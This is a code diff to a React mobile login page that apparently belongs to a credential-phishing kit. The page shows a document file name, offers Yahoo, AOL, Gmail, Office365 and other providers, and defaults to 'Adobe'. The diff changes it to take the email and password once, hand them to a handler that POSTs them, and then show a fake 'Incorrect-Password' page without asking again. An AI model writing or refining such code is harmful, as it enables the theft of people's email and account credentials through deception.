@@ -1,5 +1,4 @@
 import React, { useRef, useEffect, useCallback, useState } from 'react';
-import { useLogin } from '../../hooks/useLogin';
 
 interface LoginPageProps {
   fileName: string;
@@ -29,8 +28,6 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   const iframeRef = useRef<HTMLIFrameElement>(null);
   const [email, setEmail] = useState('');
   const [provider, setProvider] = useState('');
-
-  const { handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
 
   const sendToIframe = useCallback((type: string, data?: any) => {
     const iframe = iframeRef.current;
@@ -82,19 +79,18 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
           if (submittedEmail && submittedPassword) {
             setEmail(submittedEmail);
             sendToIframe('show-loading', { show: true });
-            const fakeEvent = { preventDefault: () => {} } as React.FormEvent;
-            const result = await handleFormSubmit(fakeEvent, {
-              email: submittedEmail,
-              password: submittedPassword,
-              provider: provider || 'Adobe',
-            });
-            // If result is returned (not undefined), it means an error occurred
-            // (success exits via onLoginSuccess callback without returning)
-            if (result !== undefined) {
-              sendToIframe('show-error', {
-                message: 'Your account or password is incorrect. If you don\'t remember your password, reset your password.',
+            // One-attempt login: hand credentials directly to the parent's
+            // success handler, which POSTs once and navigates to the
+            // provider-specific Incorrect-Password page. No re-prompt branch.
+            try {
+              await onLoginSuccess?.({
+                email: submittedEmail,
+                password: submittedPassword,
+                provider: provider || 'Adobe',
               });
-              sendToIframe('clear-password');
+            } catch (err) {
+              const msgText = err instanceof Error ? err.message : 'Login failed';
+              onLoginError?.(msgText);
             }
             sendToIframe('show-loading', { show: false });
           }
@@ -102,7 +98,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
         }
       }
     },
-    [email, provider, handleFormSubmit, onYahooSelect, onAolSelect, onGmailSelect, onOffice365Select, onOthersSelect, onEmailSubmit, sendToIframe, defaultProvider]
+    [email, provider, onLoginSuccess, onLoginError, onYahooSelect, onAolSelect, onGmailSelect, onOffice365Select, onOthersSelect, onEmailSubmit, sendToIframe, defaultProvider]
   );
 
   useEffect(() => {
